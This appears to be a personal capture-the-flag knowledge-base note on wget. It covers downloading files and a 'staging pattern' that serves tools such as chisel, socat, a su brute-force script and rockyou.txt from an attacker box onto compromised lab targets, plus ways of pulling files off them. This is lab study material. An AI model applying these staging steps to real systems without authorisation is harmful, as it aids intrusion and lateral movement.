---
type: tool
category: http-client
related: ["[[curl]]"]
---

# Wget

Non-interactive HTTP(S) downloader — the standard way to move files *onto* a target (or pull files *off* one) without a foothold.

## Command

```sh
wget http://TARGET/path/file          # saves ./file
wget http://HOST:8000/tool -O tool    # rename on save
```

- **Staging pattern:** host a file on the attacker box (`python3 -m http.server`), `wget` it from the target — this is how [[chisel]]/[[socat]] and wordlists arrive during pivoting ([[littlepivoting]]).
- **Pulling from the target:** `wget http://TARGET/secret/instrucciones.txt` retrieves app content for offline reading ([[grooti]]). The HTTP server doesn't have to be *yours*: when a directory on the target needs downloading, run `python3 -m http.server` **there** and `wget` it from the attacker — same pair, reversed direction ([[amor]] pulled `imagen.jpg` out of `~/Desktop/fotos/vacaciones` this way, the mirror image of the staging pattern above).
- **Pulling from anywhere the hint says:** when a file *isn't* on the target (an image the app points you at on the author's domain), `wget` the external URL — fetching it is the intended step, not scope creep ([[rutas]]).
- For headers/status inspection or non-200 semantics prefer [[curl]]; for bulk retrieval `wget` keeps going and resumes (`-c`).

## Seen in

[[borazuwara]] (downloaded the JPEG for metadata), [[grooti]] (instructions + image), [[littlepivoting]] (`Linux-Su-Force.sh` + `rockyou.txt` from the attacker; manual re-run staged `chisel`/`socat`), [[file]] (same staging pair — `Linux-Su-Force.sh` + `rockyou.txt` for [[su-brute-force]]), [[cap]] (downloaded pcap `0`), [[rutas]] (pulled `crackpass.jpg` off the author's GitHub Pages site for [[steganography]]), [[amor]] (pulled `imagen.jpg` off the *target-hosted* `python3 -m http.server` — reversed staging)
